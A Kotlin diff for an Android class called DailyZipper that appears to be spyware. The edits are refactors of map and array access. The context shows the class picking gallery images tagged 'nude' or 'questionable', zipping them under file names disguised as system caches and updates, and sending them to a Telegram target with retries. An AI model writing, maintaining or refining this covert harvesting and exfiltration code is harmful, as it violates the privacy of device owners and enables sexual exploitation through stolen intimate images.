@@ -24,7 +24,7 @@ import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
 /**
- * فئة تجميع الملفات وحصادها - نسخة خالية تماماً من الأقواس المربعة ودوال get
+ * فئة تجميع الملفات وحصادها - إصدار نهائي مبسط وآمن
  */
 class DailyZipper(
     context: Context,
@@ -92,14 +92,12 @@ class DailyZipper(
         loadConfig()
     }
 
-    // ========== دوال مساعدة بدلاً من get ==========
+    // ========== دوال مساعدة آمنة للخرائط (بدون أي [] أو get) ==========
     private fun extractFromMap(map: Any?, key: String): Any? {
         if (map is Map<*, *>) {
-            for (entry in map.entries) {
-                if (entry.key?.toString() == key) {
-                    return entry.value
-                }
-            }
+            return map.entries.find { entry ->
+                entry.key?.toString() == key
+            }?.value
         }
         return null
     }
@@ -157,10 +155,6 @@ class DailyZipper(
         val defaultVaultId: Long,
         val maxBatches: Int
     )
-
-    // ============================================================
-    //  باقي الدوال (loadConfig, saveConfig, getDeviceTag, checkStorage, fileHash, generateZipName, etc.)
-    // ============================================================
 
     private fun loadConfig() {
         if (!configFile.exists()) {
@@ -245,12 +239,13 @@ class DailyZipper(
         }
     }
 
+    // ========== توليد اسم ZIP بدون استخدام [] على Array ==========
     private fun generateZipName(): String {
         val prefixes = arrayOf("cache_", "sys_upd_", "tmp_vol_", "core_st_", "db_sync_")
         val dateStr = SimpleDateFormat("yyMMdd", Locale.US).format(Date())
         val random = Random()
-        // استخدام الأقواس المربعة على المصفوفات آمن ولا يسبب MatchGroupCollection
-        val prefix = prefixes[random.nextInt(prefixes.size)]
+        // استخدم .get() بدلاً من [] لتجنب أي التباس مع MatchGroupCollection
+        val prefix = prefixes.get(random.nextInt(prefixes.size))
         val chars = "abcdefghijklmnopqrstuvwxyz0123456789"
         val sb = StringBuilder()
         for (i in 0 until 6) {
@@ -312,7 +307,6 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
-                // استخدم extractBooleanFromMap بدلاً من getMapBoolean
                 val isOk = extractBooleanFromMap(result, "ok")
                 if (isOk) {
                     return true
@@ -632,7 +626,6 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // استخدم extractStringFromMap بدلاً من getMapString
                             val path = extractStringFromMap(item, "path")
                             if (path.isNotEmpty()) {
                                 val f = File(path)
